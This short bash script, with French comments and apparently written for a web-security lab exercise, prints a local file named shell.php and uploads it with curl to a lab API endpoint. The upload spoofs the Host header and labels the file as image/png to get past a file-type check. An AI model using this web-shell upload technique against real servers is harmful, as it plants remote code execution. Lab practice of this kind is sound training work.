#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1
echo "=== pwd / fichiers ==="
pwd
ls -la
echo
echo "=== contenu shell.php ==="
cat shell.php 2>&1
echo
echo "=== upload verbeux (erreur curl visible) ==="
curl -v -H 'Host: test-s3.web0x05.hbtn' -F 'file=@shell.php;type=image/png' http://web0x05.hbtn/api/task1/ 2>&1 | tail -30
